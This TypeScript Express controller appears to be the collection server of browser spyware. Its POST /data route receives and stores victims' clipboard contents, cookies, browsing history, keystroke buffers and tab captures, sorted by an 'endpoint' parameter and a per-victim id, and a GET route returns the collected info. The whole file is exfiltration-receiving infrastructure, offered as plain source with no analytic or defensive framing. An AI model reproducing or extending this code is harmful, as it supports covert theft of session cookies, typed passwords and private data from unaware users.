import { Request, Response, Router } from 'express';

import Controller from '../interfaces/controller.interface';
import InfoService from '../services/info.service';
import ClipboardService from '../services/clipboard.service';
import { DataTypes } from '../consts';
import CookieService from '../services/cookies.service';
import HistoryService from '../services/history.service';
import KeystrokeService from '../services/keystrokes.service';
import TabCaptureService from '../services/tabCapture.service';

class DataController implements Controller {
    public path = '/data';

    public router = Router();

    private infoService = new InfoService();
    private clipboardService = new ClipboardService();
    private cookieService = new CookieService();
    private historyService = new HistoryService();
    private keystrokeService = new KeystrokeService();
    private tabCaptureService = new TabCaptureService();

    constructor() {
        this.initializeRoutes();
    }

    private initializeRoutes() {
        this.router.get(`${this.path}`, this.getDataInfo);
        this.router.post(`${this.path}`, this.storeData);
    }

    private getDataInfo = async (request: Request, response: Response) => {
        try {
            return response.json(await this.infoService.getInfo());
        } catch {
            response.status(500);
            return response.json("Failed to retrieve data")
        }
    }

    private storeData = async (request: Request, response: Response) => {
        try {
            const {endpoint} = request.query;
            if (endpoint != null) {
                switch(endpoint) {
                    case DataTypes.CLIPBOARD:
                        this.clipboardService.storeClipboardData(request.body, response.locals.lastid);
                        return response.status(200).send();
                    case DataTypes.COOKIES:
                        this.cookieService.storeCookieData(request.body, response.locals.lastid);
                        return response.status(200).send();
                    case DataTypes.HISTORY:
                        this.historyService.storeHistoryData(request.body, response.locals.lastid);
                        return response.status(200).send();
                    case DataTypes.KEYSTROKES:
                        this.keystrokeService.storeKeystrokeBuffer(request.body, response.locals.lastid);
                        return response.status(200).send();
                    case DataTypes.TAB_CAPTURE:
                        this.tabCaptureService.storeTabCapture(request.body, response.locals.lastid);
                        return response.status(200).send();
                    default:
                        return response.json("Invalid endpoint");
                }
            }
            response.status(400);
            return response.send("Bad Request")
        } catch {
            response.status(500);
            return response.send("Internal server error")
        }
    }
}

export default DataController;